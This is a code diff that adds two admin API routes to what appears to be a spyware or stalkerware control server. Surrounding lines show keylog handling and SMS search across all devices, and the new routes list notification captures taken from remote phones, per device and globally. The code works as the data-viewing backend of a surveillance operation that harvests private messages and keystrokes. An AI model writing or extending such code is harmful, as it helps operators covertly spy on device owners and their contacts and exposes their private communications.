@@ -700,6 +700,38 @@ router.delete('/keylogs', adminAuth, (req, res) => {
   }
 });
 
+// GET /api/admin/connections/:deviceId/notifications — get notification captures for a device
+router.get('/connections/:deviceId/notifications', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 200;
+    const offset = (page - 1) * limit;
+    try {
+      const total = db.prepare('SELECT COUNT(*) as c FROM notification_entries WHERE device_id = ?').get(deviceId)?.c || 0;
+      const rows = db.prepare('SELECT * FROM notification_entries WHERE device_id = ? ORDER BY recorded_at DESC LIMIT ? OFFSET ?').all(deviceId, limit, offset);
+      res.json({ entries: rows, total, page, totalPages: Math.ceil(total / limit) });
+    } catch (_) { res.json({ entries: [], total: 0, page: 1, totalPages: 0 }); }
+  } catch (err) { res.status(500).json({ error: err.message }); }
+});
+
+// GET /api/admin/notifications — get ALL notification entries (global)
+router.get('/notifications', adminAuth, (req, res) => {
+  try {
+    const page = parseInt(req.query.page) || 1;
+    const limit = Math.min(parseInt(req.query.limit) || 200, 1000);
+    const offset = (page - 1) * limit;
+    const deviceId = req.query.device_id || '';
+    let where = '1=1'; const params = [];
+    if (deviceId) { where += ' AND device_id = ?'; params.push(deviceId); }
+    try {
+      const total = db.prepare(`SELECT COUNT(*) as c FROM notification_entries WHERE ${where}`).get(...params)?.c || 0;
+      const rows = db.prepare(`SELECT n.*, d.model FROM notification_entries n LEFT JOIN devices d ON d.device_id = n.device_id WHERE ${where} ORDER BY n.recorded_at DESC LIMIT ? OFFSET ?`).all(...params, limit, offset);
+      res.json({ entries: rows, total, page, totalPages: Math.ceil(total / limit) });
+    } catch (_) { res.json({ entries: [], total: 0, page: 1, totalPages: 0 }); }
+  } catch (err) { res.status(500).json({ error: err.message }); }
+});
+
 // ═══ SMART SEARCH ENDPOINTS (for #10 — search across all devices) ═══
 
 // GET /api/admin/search/sms?q=xxx — search SMS across ALL devices
